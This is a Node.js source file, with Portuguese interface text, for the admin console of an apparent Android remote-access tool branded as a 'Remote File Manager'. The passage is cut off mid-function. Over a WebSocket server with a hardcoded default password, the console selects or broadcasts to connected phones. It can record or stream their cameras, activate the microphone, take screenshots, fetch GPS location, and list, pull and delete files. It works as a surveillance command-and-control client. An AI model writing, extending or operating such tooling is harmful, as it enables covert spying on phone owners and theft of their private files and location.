const WebSocket = require('ws');
const readline = require('readline');
const chalk = require('chalk');
const { showLocationInfo } = require('./ShowLocation.js');
const { base64ToPng } = require('./base64Image');

function printFileList(files) {
  const formatBytes = (bytes) => {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
  };

  const formatDate = (dateStr) => {
    if (!dateStr) return 'N/A';
    const date = new Date(dateStr);
    return date.toLocaleString('pt-BR', {
      day: '2-digit',
      month: '2-digit',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
    });
  };

  const maxNameLength = Math.max(...files.map(file => file.name.length), 20);

  console.log(chalk.bold.cyan('\n📂 Lista de Arquivos e Pastas'));
  console.log(chalk.bold(
    'Nome'.padEnd(maxNameLength) +
    ' | Tipo    | Tamanho    | Modificado'
  ));
  console.log('-'.repeat(maxNameLength + 32));

  files.forEach(file => {
    const isDir = file.isDirectory;
    const icon = isDir ? '📁' : '📄';
    const type = isDir ? 'Pasta' : 'Arquivo';
    const name = file.name.padEnd(maxNameLength);
    const size = formatBytes(file.size).padStart(10);
    const modified = formatDate(file.mtime);

    console.log(
      `${chalk.yellow(icon)} ${name} | ` +
      `${chalk.green(type.padEnd(7))} | ` +
      `${chalk.blue(size)} | ` +
      `${chalk.gray(modified)}`
    );
  });

  console.log(chalk.bold(`\nTotal: ${files.length} itens\n`));
}

class AdminClient {
  constructor(serverUrl = 'ws://localhost:8080', password = 'admin123') {
    this.serverUrl = serverUrl;
    this.password = password;
    this.ws = null;
    this.adminId = null;
    this.isConnected = false;
    this.reconnectAttempts = 0;
    this.maxReconnectAttempts = 5;
    this.reconnectDelay = 3000;
    this.selectedClient = null; // Cliente selecionado
    this.clientInfo = new Map(); // Informações dos clientes
    this.clientPaths = new Map()

    this.setupReadline();
    this.connect();
  }

  setupReadline() {
    this.rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout
    });

    this.rl.on('line', (input) => {
      this.handleCommand(input.trim());
    });
  }

  connect() {
    console.log(chalk.blue(`🔌 Conectando ao servidor ${this.serverUrl}...`));

    try {
      this.ws = new WebSocket(this.serverUrl);

      this.ws.on('open', () => {
        this.onConnect();
      });

      this.ws.on('message', (data) => {
        this.onMessage(data.toString());
      });

      this.ws.on('close', () => {
        this.onDisconnect();
      });

      this.ws.on('error', (error) => {
        this.onError(error);
      });

    } catch (error) {
      console.error(chalk.red('❌ Erro ao conectar:'), error.message);
      this.scheduleReconnect();
    }
  }

  onConnect() {
    console.log(chalk.green('✅ Conectado ao servidor!'));
    console.log(chalk.yellow('🔐 Autenticando como admin...'));

    // Enviar autenticação
    this.send({
      type: 'admin_auth',
      password: this.password
    });
  }

  onMessage(data) {
    try {
      const message = JSON.parse(data);

      switch (message.type) {
        case 'admin_welcome':
          this.isConnected = true;
          this.adminId = message.adminId;
          this.reconnectAttempts = 0;

          console.log(chalk.green.bold('\n👑 AUTENTICADO COMO ADMIN'));
          console.log(chalk.cyan(`📋 Admin ID: ${message.adminId}`));
          console.log(chalk.cyan(`📊 Clientes conectados: ${message.stats.clients}`));
          console.log(chalk.cyan(`👥 Admins conectados: ${message.stats.admins}`));
          console.log(chalk.yellow('\n💡 Digite "help" para ver os comandos disponíveis\n'));
          this.updatePrompt();
          break;

        case 'client_connected':
          console.log(chalk.green(`\n✅ Cliente ${message.clientId} conectado`));
          console.log(chalk.gray(`   📍 ${message.address}:${message.port}`));
          console.log(chalk.gray(`   📱 ${message.deviceType}`));

          // Atualizar informações do cliente
          this.clientInfo.set(message.clientId, {
            id: message.clientId,
            //wallpaper:message.wallpaper,
            address: message.address,
            port: message.port,
            deviceType: message.deviceType
          });

          this.clientPaths.set(message.clientId, '/storage/emulated/0');
          this.updatePrompt();
          break;

        case 'client_disconnected':
          console.log(chalk.red(`\n❌ Cliente ${message.clientId} desconectado`));
          this.clientInfo.delete(message.clientId);
          this.clientPaths.delete(message.clientId);
          // Se era o cliente selecionado, desselecionar
          if (this.selectedClient === message.clientId) {
            this.selectedClient = null;
            console.log(chalk.yellow(`⚠️  Cliente selecionado foi desconectado`));
          }
          this.updatePrompt();
          break;
        //aqui
        case 'client_message':
          try {
            const clientMsg = JSON.parse(message.message);

            // Atualizar path do cliente se disponível
            const newPath = clientMsg.c_path || clientMsg.currentPath || clientMsg.data?.currentPath;
            if (newPath) {
              this.clientPaths.set(message.clientId, newPath);
            }

            // Handlers por tipo de mensagem
            const handlers = {
              file_list: () => {
                //if (clientMsg.location) showLocationInfo(clientMsg.location);
                printFileList(clientMsg.data, message.clientId, newPath);
              },

              temp: () => handlers.file_list(),

              location: () => showLocationInfo(clientMsg.location),

              change_directory_success: () => {
                // Path já foi atualizado acima
              },

              change_directory_error: () => {
                console.log(chalk.red(`   ❌ Erro ao mudar diretório: ${clientMsg.error}`));
              },

              screenshot:()=>{
                base64ToPng(clientMsg.screenshot)
              .then(filePath => console.log('file saved in path:', filePath))
              .catch(error => console.error('Erro:', error));
              },

              recorded: () =>{
                console.log("✅ STREAM STARTED : ",clientMsg.streamUrl)
              },

              recorded: () =>{
                console.log("✅ Video recorded")
              },


              navigation_update: () => {
                console.log(chalk.cyan(`   📂 Navegou para: ${clientMsg.data.currentPath}`));
                console.log(chalk.gray(`      ${clientMsg.data.filesCount} arquivos encontrados`));
              },

              status: () => {
                console.log(chalk.cyan('   📊 Status do Cliente:'));
                console.log(chalk.gray(`      📂 Diretório: ${clientMsg.data.currentPath}`));
                console.log(chalk.gray(`      📄 Arquivos: ${clientMsg.data.filesCount}`));
                console.log(chalk.gray(`      ✅ Selecionados: ${clientMsg.data.selectedCount}`));
                console.log(chalk.gray(`      📤 Fila upload: ${clientMsg.data.uploadQueueLength}`));
              },

              upload_started: () => {
                console.log(chalk.blue(`   🚀 Upload iniciado: ${clientMsg.data.fileName}`));
                console.log(chalk.gray(`      Tamanho: ${this.formatBytes(clientMsg.data.fileSize)}`));
              },

              upload_progress: () => {
                console.log(chalk.yellow(`   📈 Upload: ${clientMsg.data.fileName} - ${clientMsg.data.progress}%`));
              },

              upload_completed: () => {
                console.log(chalk.green(`   ✅ Upload completo: ${clientMsg.data.fileName}`));
              },

              upload_failed: () => {
                console.log(chalk.red(`   ❌ Upload falhou: ${clientMsg.data.fileName}`));
                console.log(chalk.red(`      Erro: ${clientMsg.data.error}`));
              },

              error: () => console.log(`❌ ${clientMsg.error}`),
            };

            // Executar handler se existir
            handlers[clientMsg.type]?.();

          } catch {
            // Mensagem não é JSON válido
          }

          this.updatePrompt();
          break;

        case 'client_list':
          this.displayClientList(message.clients);
          // Salvar informações dos clientes
          message.clients.forEach(client => {
            this.clientInfo.set(client.id, client);
          });
          this.updatePrompt();
          break;

        case 'admin_list':
          this.displayAdminList(message.admins);
          this.updatePrompt();
          break;

        case 'server_status':
          this.displayServerStatus(message.status);
          this.updatePrompt();
          break;

        case 'client_state':
          this.displayClientState(message.clientId, message.state);
          if (message.state && message.state.currentPath) {
            this.clientPaths.set(message.clientId, message.state.currentPath);
            this.updatePrompt();
          } else {
            this.updatePrompt();
          }
          break;

        case 'command_result':
          if (message.success) {
            console.log(chalk.green(`\n✅ ${message.message}`));
            if (message.clientCount !== undefined) {
              console.log(chalk.gray(`   📢 Enviado para ${message.clientCount} cliente(s)`));
            }
            if (message.sentMessage) {
              console.log(chalk.gray(`   📋 Comando: ${message.sentMessage.substring(0, 80)}${message.sentMessage.length > 80 ? '...' : ''}`));
            }
          } else {
            console.log(chalk.red(`\n❌ ${message.message}`));
            if (message.sentMessage) {
              console.log(chalk.gray(`   📋 Tentou enviar: ${message.sentMessage}`));
            }
          }
          this.updatePrompt();
          break;

        case 'server_shutdown':
          console.log(chalk.red('\n🛑 Servidor está sendo encerrado!'));
          this.isConnected = false;
          break;

        case 'pong':
          console.log(chalk.gray(`\n🏓 Pong recebido (${Date.now() - message.timestamp}ms)`));
          this.updatePrompt();
          break;

        case 'error':
          console.log(chalk.red(`\n❌ Erro: ${message.message}`));
          this.updatePrompt();
          break;

        default:
          console.log(chalk.yellow(`\n📩 Mensagem recebida:`));
          console.log(JSON.stringify(message, null, 2));
          this.updatePrompt();
      }

    } catch (error) {
      console.error(chalk.red('❌ Erro ao processar mensagem:'), error.message);
      console.log(chalk.gray(`Raw data: ${data}`));
    }
  }

  onDisconnect() {
    this.isConnected = false;
    console.log(chalk.yellow('\n⚠️  Desconectado do servidor'));

    if (this.reconnectAttempts < this.maxReconnectAttempts) {
      this.scheduleReconnect();
    } else {
      console.log(chalk.red('❌ Número máximo de tentativas de reconexão atingido'));
      console.log(chalk.yellow('💡 Digite "reconnect" para tentar novamente'));
    }
  }

  onError(error) {
    if (error.code === 'ECONNREFUSED') {
      console.error(chalk.red('❌ Não foi possível conectar ao servidor'));
    } else {
      console.error(chalk.red('❌ Erro:'), error.message);
    }
  }

  scheduleReconnect() {
    this.reconnectAttempts++;
    console.log(chalk.yellow(`🔄 Tentando reconectar em ${this.reconnectDelay / 1000}s (${this.reconnectAttempts}/${this.maxReconnectAttempts})...`));

    setTimeout(() => {
      this.connect();
    }, this.reconnectDelay);
  }

  send(data) {
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
      console.log(chalk.red('❌ Não conectado ao servidor'));
      return false;
    }

    try {
      this.ws.send(JSON.stringify(data));
      return true;
    } catch (error) {
      console.error(chalk.red('❌ Erro ao enviar:'), error.message);
      return false;
    }
  }

  handleCommand(input) {
    if (!input) {
      this.updatePrompt();
      return;
    }

    const [cmd, ...args] = input.split(' ');


    if (this.selectedClient === null){
      switch (cmd.toLowerCase()) {
        case 'clients':
      case 'list':
        this.send({ type: 'list_clients' });
        break;
      case 'select':
      case 'sel':
        if (args.length === 0) {
          if (this.selectedClient !== null) {
            const currentPath = this.clientPaths.get(this.selectedClient) || '/storage/emulated/0';
            console.log(chalk.cyan(`📌 Cliente selecionado atualmente: ${this.selectedClient}`));
            const client = this.clientInfo.get(this.selectedClient);
            if (client) {
              console.log(chalk.gray(`   📱 Tipo: ${client.deviceType}`));
              console.log(chalk.gray(`   📍 Endereço: ${client.address}:${client.port}`));
            }
          } else {
            console.log(chalk.yellow('Nenhum cliente selecionado'));
            console.log(chalk.gray('Uso: select <client_id>'));
            console.log(chalk.gray('Exemplo: select 1'));
          }
        } else {
          const clientId = parseInt(args[0]);

          // Verificar se o cliente existe
          if (this.clientInfo.has(clientId)) {
            this.selectedClient = clientId;
            const currentPath = this.clientPaths.get(clientId) || '/storage/emulated/0';
            const client = this.clientInfo.get(clientId);
            console.log(chalk.green(`✅ Cliente ${clientId} selecionado!`));
            console.log(chalk.gray(`   📱 Tipo: ${client.deviceType}`));
            console.log(chalk.gray(`   📍 Endereço: ${client.address}:${client.port}`));
            console.log(chalk.cyan(`\n💡 Agora os comandos (ls, cd, rm, upload) serão enviados apenas para este cliente`));
            console.log(chalk.gray(`   Use "deselect" para voltar ao modo broadcast`));
          } else {
            console.log(chalk.red(`❌ Cliente ${clientId} não encontrado`));
            console.log(chalk.yellow(`💡 Use "clients" para ver os clientes disponíveis`));
          }
        }
        break;
    }
    return
  }


    switch (cmd.toLowerCase()) {
      case 'help':
      case '?':
        this.showHelp();
        break;

      case 'clients':
      case 'list':
        this.send({ type: 'list_clients' });
        break;

      case 'admins':
        this.send({ type: 'list_admins' });
        break;

      case 'status':
        this.send({ type: 'server_status' });
        break;

      case 'send':
        if (args.length < 2) {
          // Se tem cliente selecionado, enviar diretamente
          if (this.selectedClient !== null) {
            const message = args.join(' ');

            try {
              const jsonMessage = JSON.parse(message);
              this.send({
                type: 'send_to_client',
                clientId: this.selectedClient,
                message: jsonMessage
              });
              console.log(chalk.green(`📤 Comando enviado para cliente ${this.selectedClient}`));
            } catch (error) {
              console.log(chalk.red('❌ JSON inválido'));
            }
          } else {
            console.log(chalk.yellow('Uso: send <client_id> <comando_json>'));
            console.log(chalk.gray('Ou selecione um cliente primeiro com: select <id>'));
            console.log(chalk.gray('Exemplo: send 1 {"type":"list_files","path":"/sdcard"}'));
          }
        } else {
          const clientId = parseInt(args[0]);
          const message = args.slice(1).join(' ');

          try {
            const jsonMessage = JSON.parse(message);
            this.send({
              type: 'send_to_client',
              clientId: clientId,
              message: jsonMessage
            });
            console.log(chalk.green(`📤 Comando enviado para cliente ${clientId}`));
          } catch (error) {
            console.log(chalk.red('❌ JSON inválido'));
          }
        }
        break;

      case 'broadcast':
        if (args.length === 0) {
          console.log(chalk.yellow('Uso: broadcast <comando_json>'));
          console.log(chalk.gray('Exemplo: broadcast {"type":"get_status"}'));
        } else {
          const message = args.join(' ');

          try {
            const jsonMessage = JSON.parse(message);
            this.send({
              type: 'broadcast_to_clients',
              message: jsonMessage
            });
            console.log(chalk.green('📢 Broadcast enviado'));
          } catch (error) {
            console.log(chalk.red('❌ JSON inválido'));
          }
        }
        break;

      case 'kick':
        if (args.length === 0) {
          console.log(chalk.yellow('Uso: kick <client_id>'));
        } else {
          const clientId = parseInt(args[0]);
          this.send({
            type: 'kick_client',
            clientId: clientId
          });
        }
        break;

      case 'state':
        if (args.length === 0) {
          if (this.selectedClient !== null) {
            this.send({
              type: 'get_client_state',
              clientId: this.selectedClient
            });
          } else {
            console.log(chalk.yellow('Uso: state <client_id>'));
            console.log(chalk.gray('Ou selecione um cliente primeiro com: select <id>'));
          }
        } else {
          const clientId = parseInt(args[0]);
          this.send({
            type: 'get_client_state',
            clientId: clientId
          });
        }
        break;

      case 'select':
      case 'sel':
        if (args.length === 0) {
          if (this.selectedClient !== null) {
            const currentPath = this.clientPaths.get(this.selectedClient) || '/storage/emulated/0';
            console.log(chalk.cyan(`📌 Cliente selecionado atualmente: ${this.selectedClient}`));
            const client = this.clientInfo.get(this.selectedClient);
            if (client) {
              console.log(chalk.gray(`   📱 Tipo: ${client.deviceType}`));
              console.log(chalk.gray(`   📍 Endereço: ${client.address}:${client.port}`));
            }
          } else {
            console.log(chalk.yellow('Nenhum cliente selecionado'));
            console.log(chalk.gray('Uso: select <client_id>'));
            console.log(chalk.gray('Exemplo: select 1'));
          }
        } else {
          const clientId = parseInt(args[0]);

          // Verificar se o cliente existe
          if (this.clientInfo.has(clientId)) {
            this.selectedClient = clientId;
            const currentPath = this.clientPaths.get(clientId) || '/storage/emulated/0';
            const client = this.clientInfo.get(clientId);
            console.log(chalk.green(`✅ Cliente ${clientId} selecionado!`));
            console.log(chalk.gray(`   📱 Tipo: ${client.deviceType}`));
            console.log(chalk.gray(`   📍 Endereço: ${client.address}:${client.port}`));
            console.log(chalk.cyan(`\n💡 Agora os comandos (ls, cd, rm, upload) serão enviados apenas para este cliente`));
            console.log(chalk.gray(`   Use "deselect" para voltar ao modo broadcast`));
          } else {
            console.log(chalk.red(`❌ Cliente ${clientId} não encontrado`));
            console.log(chalk.yellow(`💡 Use "clients" para ver os clientes disponíveis`));
          }
        }
        break;

      case 'deselect':
      case 'desel':
        if (this.selectedClient !== null) {
          const prevClient = this.selectedClient;
          this.selectedClient = null;
          console.log(chalk.yellow(`📌 Cliente ${prevClient} desselecionado`));
          console.log(chalk.cyan(`💡 Modo broadcast ativado - comandos serão enviados para todos os clientes`));
        } else {
          console.log(chalk.gray('Nenhum cliente estava selecionado'));
        }
        break;
      case 'rec':
        if (this.selectedClient !== null) {
          if (args.length === 0) {
            console.log(chalk.yellow('Use: rec front | rec back'));
          }
          const cameratype = args.join(' ') || '';
          if (cameratype != 'front' && cameratype != 'back') {
            console.log(chalk.yellow('Use: rec front | rec back'));
            break;
          }
          this.send({
            type: 'send_to_client',
            clientId: this.selectedClient,
            message: { type: 'rec', cameratype: cameratype, }
          });
        } else {

        }
        break;
      case 'rec_stop':
        if (this.selectedClient !== null) {
          this.send({
            type: 'send_to_client',
            clientId: this.selectedClient,
            message: { type: 'rec_stop' }
          });
        } else {
        }
        break;
        case 'stream':
          if (this.selectedClient !== null) {
            if (args.length === 0) {
              console.log(chalk.yellow('Use: rec front | rec back'));
            }
            const cameratype = args.join(' ') || '';
            if (cameratype != 'front' && cameratype != 'back') {
              console.log(chalk.yellow('Use: rec front | rec back'));
              break;
            }
            this.send({
              type: 'send_to_client',
              clientId: this.selectedClient,
              message: { type: 'stream' }
            });
          } else {
  
          }
          break;
          case 'stopstream':
            if (this.selectedClient !== null) {
              this.send({
                type: 'send_to_client',
                clientId: this.selectedClient,
                message: { type: 'stopstream' }
              });
            } else {
    
            }
            break;
        case 'pic':
          if (this.selectedClient !== null) {
            if (args.length === 0) {
              console.log(chalk.yellow('Use: pic front | pic back'));
            }
            const cameratype = args.join(' ') || '';
            if (cameratype != 'front' && cameratype != 'back') {
              console.log(chalk.yellow('Use: rec front | rec back'));
              break;
            }
            this.send({
              type: 'send_to_client',
              clientId: this.selectedClient,
              message: { type: 'pic', cameratype: cameratype, }
            });
          } else {
  
          }
          break;
        case 'play':
          if (this.selectedClient !== null) {
            if (args.length === 0) {
              console.log(chalk.yellow('Use: play file | play https://'));
            }
            const file = args.join(' ') || '';
            if (!file) {
              console.log(chalk.yellow('Use: rec front | rec back'));
              break;
            }
            this.send({
              type: 'send_to_client',
              clientId: this.selectedClient,
              message: { type: 'play', video: file, }
            });
          } else {
  
          }
          break;
        case 'mic':
        if (this.selectedClient !== null) {
          this.send({
            type: 'send_to_client',
            clientId: this.selectedClient,
            message: { type: 'mic' }
          });
        } else {
        }
        break;
        case 'mic_stop':
        if (this.selectedClient !== null) {
          this.send({
            type: 'send_to_client',
            clientId: this.selectedClient,
            message: { type: 'mic_stop' }
          });
        } else {
        }
        break;
        case 'shot':
        if (this.selectedClient !== null) {
          this.send({
            type: 'send_to_client',
            clientId: this.selectedClient,
            message: { type: 'screenshot' }
          });
        } else {

        }
        break;

      case 'ls':
        const lsPath = args[0] || '';
        if (this.selectedClient !== null) {
          this.send({
            type: 'send_to_client',
            clientId: this.selectedClient,
            message: { type: 'list_files', path: lsPath }
          });
          console.log(chalk.green(`📂 Comando ls enviado para cliente ${this.selectedClient}: ${lsPath}`));
        } else {
          this.send({
            type: 'broadcast_to_clients',
            message: { type: 'list_files', path: lsPath }
          });
          console.log(chalk.green(`📂 Comando ls enviado (broadcast): ${lsPath}`));
        }
        break;

      case 'cd':
        if (args.length === 0) {
          console.log(chalk.yellow('Uso: cd <caminho>'));
        } else {
          const cdPath = args.join(' ');
          if (this.selectedClient !== null) {
            this.send({
              type: 'send_to_client',
              clientId: this.selectedClient,
              message: { type: 'change_directory', path: cdPath }
            });
            console.log(chalk.green(`📂 Comando cd enviado para cliente ${this.selectedClient}: ${cdPath}`));
          } else {
            this.send({
              type: 'broadcast_to_clients',
              message: { type: 'change_directory', path: cdPath }
            });
            console.log(chalk.green(`📂 Comando cd enviado (broadcast): ${cdPath}`));
          }
        }
        break;

      case 'rm':
        if (args.length === 0) {
          console.log(chalk.yellow('Uso: rm <caminho_arquivo>'));
        } else {
          const rmPath = args.join(' ');
          if (this.selectedClient !== null) {
            this.send({
              type: 'send_to_client',
              clientId: this.selectedClient,
              message: { type: 'delete_file', path: rmPath }
            });
            console.log(chalk.green(`🗑️  Comando rm enviado para cliente ${this.selectedClient}: ${rmPath}`));
          } else {
            this.send({
              type: 'broadcast_to_clients',
              message: { type: 'delete_file', path: rmPath }
            });
            console.log(chalk.green(`🗑️  Comando rm enviado (broadcast): ${rmPath}`));
          }
        }
        break;

      case 'location':
        if (this.selectedClient !== null) {
          this.send({
            type: 'send_to_client',
            clientId: this.selectedClient,
            message: { type: 'location' }
          });
        } else {
        }
        break;

      case 'down':
      case 'download':
        if (args.length === 0) {
          console.log(chalk.yellow('Uso: upload <caminho_arquivo>'));
        } else {
          const uploadPath = args.join(' ');
          if (this.selectedClient !== null) {
            this.send({
              type: 'send_to_client',
              clientId: this.selectedClient,
              message: { type: 'download_file', file: uploadPath }
            });
            console.log(chalk.green(`📤 Comando upload enviado para cliente ${this.selectedClient}: ${uploadPath}`));
          } /*else {
            this.send({
              type: 'broadcast_to_clients',
              message: { type: 'upload_file', file: uploadPath }
            });
            console.log(chalk.green(`📤 Comando upload enviado (broadcast): ${uploadPath}`));
          }*/
        }
        break;
        case 'upload':
          if (args.length === 0) {
            console.log(chalk.yellow('Uso: upload <caminho_arquivo>'));
          } else {
            const uploadPath = args.join(' ');
            if (this.selectedClient !== null) {
              this.send({
                type: 'send_to_client',
                clientId: this.selectedClient,
                message: { type: 'upload_file', file: uploadPath }
              });
              console.log(chalk.green(`📤 Comando upload enviado para cliente ${this.selectedClient}: ${uploadPath}`));
            } /*else {
              this.send({
                type: 'broadcast_to_clients',
                message: { type: 'upload_file', file: uploadPath }
              });
              console.log(chalk.green(`📤 Comando upload enviado (broadcast): ${uploadPath}`));
            }*/
          }
          break;

      case 'ping':
        this.send({ type: 'ping' });
        break;

      case 'debug':
        if (args.length === 0) {
          console.log(chalk.yellow('Uso: debug <comando>'));
          console.log(chalk.gray('Exemplos:'));
          console.log(chalk.gray('  debug ls /sdcard'));
          console.log(chalk.gray('  debug cd /storage/emulated/0'));
        } else {
          const debugCmd = args[0];
          const debugArgs = args.slice(1);

          let debugMessage = null;

          switch (debugCmd) {
            case 'ls':
              debugMessage = { type: 'list_files', path: debugArgs[0] || '' };
              break;
            case 'cd':
              debugMessage = { type: 'change_directory', path: debugArgs.join(' ') };
              break;
            case 'rm':
              debugMessage = { type: 'delete_file', path: debugArgs.join(' ') };
              break;
            case 'upload':
              debugMessage = { type: 'upload_file', file: debugArgs.join(' ') };
              break;
            case 'download':
              debugMessage = { type: 'download_file', file: debugArgs.join(' ') };
              break;
            default:
              try {
                debugMessage = JSON.parse(args.join(' '));
              } catch {
                console.log(chalk.red('❌ Comando inválido'));
                break;
              }
          }

          if (debugMessage) {
            console.log(chalk.cyan('\n🔍 Debug - Mensagem que seria enviada:'));
            console.log(chalk.yellow(JSON.stringify(debugMessage, null, 2)));
            console.log(chalk.gray(`\nTamanho: ${JSON.stringify(debugMessage).length} bytes`));
          }
        }
        break;

      case 'reconnect':
        this.reconnectAttempts = 0;
        console.log(chalk.blue('🔄 Tentando reconectar...'));
        this.connect();
        break;

      case 'clear':
        console.clear();
        this.showBanner();
        break;

      case 'exit':
      case 'quit':
        this.disconnect();
        break;

      default:
        console.log(chalk.red(`❌ Comando desconhecido: ${cmd}`));
        console.log(chalk.yellow('💡 Digite "help" para ver os comandos disponíveis'));
    }

    this.updatePrompt();
  }

  showHelp() {
    console.log(chalk.cyan.bold('\n=== ADMIN CLIENT - COMANDOS ==='));
    console.log(chalk.white('\n📊 Informações do Servidor:'));
    console.log('  help, ?           - Mostra esta ajuda');
    console.log('  clients, list     - Lista todos os clientes conectados');
    console.log('  admins            - Lista todos os admins conectados');
    console.log('  status            - Mostra status do servidor');
    console.log('  state [id]        - Mostra estado de um cliente (usa selecionado se omitido)');

    console.log(chalk.white('\n🎯 Seleção de Cliente:'));
    console.log('  select <id>       - Seleciona um cliente específico');
    console.log('  deselect          - Desseleciona o cliente atual (volta ao broadcast)');
    console.log(chalk.gray('  💡 Quando um cliente está selecionado, os comandos ls/cd/rm/upload'));
    console.log(chalk.gray('     são enviados apenas para ele ao invés de broadcast'));

    console.log(chalk.white('\n📤 Envio de Comandos:'));
    console.log('  send <id> <json>  - Envia comando para cliente específico');
    console.log('  send <json>       - Envia para cliente selecionado (se houver)');
    console.log('  broadcast <json>  - Envia comando para todos os clientes');
    console.log('  kick <id>         - Desconecta um cliente');

    console.log(chalk.white('\n📂 Comandos de File Manager:'));
    console.log('  ls [caminho]      - Lista arquivos (cliente selecionado ou broadcast)');
    console.log('  cd <caminho>      - Muda diretório (cliente selecionado ou broadcast)');
    console.log('  rm <arquivo>      - Remove arquivo (cliente selecionado ou broadcast)');
    console.log('  upload <arquivo>  - Faz upload de arquivo (cliente selecionado ou broadcast)');

    console.log(chalk.white('\n🔧 Utilitários:'));
    console.log('  ping              - Testa conexão com servidor');
    console.log('  debug <cmd>       - Mostra o JSON que seria enviado (sem enviar)');
    console.log('  reconnect         - Reconecta ao servidor');
    console.log('  clear             - Limpa a tela');
    console.log('  exit, quit        - Desconecta e sai');

    console.log(chalk.yellow('\n📝 Exemplos:'));
    console.log(chalk.gray('  # Modo tradicional (especificar cliente)'));
    console.log(chalk.gray('  send 1 {"type":"list_files","path":"/sdcard/Downloads"}'));
    console.log(chalk.gray('  \n  # Modo seleção (mais prático)'));
    console.log(chalk.gray('  select 1           # Seleciona cliente 1'));
    console.log(chalk.gray('  ls /sdcard/DCIM    # Envia apenas para cliente 1'));
    console.log(chalk.gray('  cd Downloads       # Envia apenas para cliente 1'));
    console.log(chalk.gray('  deselect           # Volta ao modo broadcast'));
    console.log(chalk.gray('  ls /sdcard         # Agora envia para todos'));
    console.log(chalk.cyan('\n================================\n'));
  }

  showBanner() {
    console.log(chalk.green.bold('\n╔════════════════════════════════════════╗'));
    console.log(chalk.green.bold('║   REMOTE FILE MANAGER - ADMIN CLIENT   ║'));
    console.log(chalk.green.bold('╚════════════════════════════════════════╝'));
  }

  displayClientList(clients) {
    if (clients.length === 0) {
      console.log(chalk.yellow('\n📭 Nenhum cliente conectado'));
      return;
    }

    const refClient = clients.reduce((max, client) =>
      client.deviceType.length > max.deviceType.length ? client : max
      , clients[0]);

    const maxDeviceTypeLength = refClient.deviceType.length;
    const separatorLength = maxDeviceTypeLength + 16 + 12 + 5 + 12 + 10;

    console.log(chalk.cyan.bold(`\n👥 Clientes Conectados (${clients.length}):`));
    console.log(chalk.white('─'.repeat(90)));
    console.log(chalk.bold(`ID | Endereço                 | Tipo ${' '.repeat(refClient.deviceType.length - 4)}| Conectado há | Msgs  | Status      `));
    console.log(chalk.white('─'.repeat(90)));

    clients.forEach(client => {
      const timeDiff = new Date() - new Date(client.connectedAt);
      const timeStr = this.formatDuration(timeDiff);
      const address = `${client.address}:${client.port}`.padEnd(16);
      const deviceType = client.deviceType.padEnd(12);
      const alive = client.isAlive ? chalk.green('✓ Ativo') : chalk.red('✗ Inativo');
      const selected = this.selectedClient === client.id ? chalk.yellow(' ◄ SELECIONADO') : '';

      console.log(
        `${chalk.yellow(client.id.toString().padStart(2))} | ` +
        `${chalk.gray(address)} | ` +
        `${chalk.cyan(deviceType)} | ` +
        `${chalk.blue(timeStr.padEnd(12))} | ` +
        `${chalk.magenta(client.messageCount.toString().padStart(5))} | ` +
        `${alive}${selected}`
      );
    });
    console.log(chalk.white('─'.repeat(90)));

    if (this.selectedClient !== null) {
      console.log(chalk.cyan(`\n📌 Cliente ${this.selectedClient} está selecionado (comandos enviados apenas para ele)`));
    } else {
      console.log(chalk.gray('\n💡 Use "select <id>" para selecionar um cliente específico'));
    }
  }

  displayAdminList(admins) {
    if (admins.length === 0) {
      console.log(chalk.yellow('\n📭 Nenhum admin conectado'));
      return;
    }

    console.log(chalk.cyan.bold(`\n👑 Admins Conectados (${admins.length}):`));
    console.log(chalk.white('─'.repeat(70)));
    console.log(chalk.bold('ID | Endereço          | Conectado há | Msgs'));
    console.log(chalk.white('─'.repeat(70)));

    admins.forEach(admin => {
      const timeDiff = new Date() - new Date(admin.connectedAt);
      const timeStr = this.formatDuration(timeDiff);
      const address = `${admin.address}:${admin.port}`.padEnd(16);
      const isYou = admin.id === this.adminId ? chalk.green(' (você)') : '';

      console.log(
        `${chalk.yellow(admin.id.toString().padStart(2))} | ` +
        `${chalk.gray(address)} | ` +
        `${chalk.blue(timeStr.padEnd(12))} | ` +
        `${chalk.magenta(admin.messageCount.toString().padStart(4))}${isYou}`
      );
    });
    console.log(chalk.white('─'.repeat(70)));
  }

  displayServerStatus(status) {
    console.log(chalk.cyan.bold('\n📊 Status do Servidor:'));
    console.log(chalk.white('─'.repeat(50)));
    console.log(chalk.white('🚀 Porta:              ') + chalk.yellow(status.port));
    console.log(chalk.white('👥 Clientes:           ') + chalk.yellow(status.clients));
    console.log(chalk.white('👑 Admins:             ') + chalk.yellow(status.admins));
    console.log(chalk.white('📍 Estados salvos:     ') + chalk.yellow(status.clientStates));
    console.log(chalk.white('⏱️  Uptime:             ') + chalk.yellow(status.uptimeFormatted));
    console.log(chalk.white('💾 Memória:            ') + chalk.yellow(this.formatBytes(status.memory)));
    console.log(chalk.white('🕐 Iniciado em:        ') + chalk.yellow(new Date(status.startTime).toLocaleString('pt-BR')));
    console.log(chalk.white('─'.repeat(50)));
  }

  displayClientState(clientId, state) {
    if (!state) {
      console.log(chalk.red(`\n❌ Cliente ${clientId} não tem estado salvo`));
      return;
    }

    console.log(chalk.cyan.bold(`\n📋 Estado do Cliente ${clientId}:`));
    console.log(chalk.white('─'.repeat(60)));
    console.log(chalk.white('📂 Diretório atual:    ') + chalk.yellow(state.currentPath));
    console.log(chalk.white('📄 Arquivos:           ') + chalk.yellow(state.files ? state.files.length : 0));
    console.log(chalk.white('✅ Selecionados:       ') + chalk.yellow(state.selectedFiles ? state.selectedFiles.length : 0));
    console.log(chalk.white('📤 Fila de upload:     ') + chalk.yellow(state.uploadQueue ? state.uploadQueue.length : 0));
    console.log(chalk.white('🕐 Última atualização: ') + chalk.yellow(new Date(state.lastUpdate).toLocaleString('pt-BR')));
    console.log(chalk.white('─'.repeat(60)));

    if (state.selectedFiles && state.selectedFiles.length > 0) {
      console.log(chalk.cyan('\n✅ Arquivos Selecionados:'));
      state.selectedFiles.forEach((file, index) => {
        const fileName = file.split('/').pop();
        console.log(chalk.gray(`   ${index + 1}. ${fileName}`));
      });
    }
  }

  updatePrompt() {
    const status = this.isConnected ? chalk.green('●') : chalk.red('●');
    const adminInfo = this.adminId ? chalk.cyan(`Admin ${this.adminId}`) : chalk.gray('Desconectado');

    let clientInfo = '';
    if (this.selectedClient !== null) {
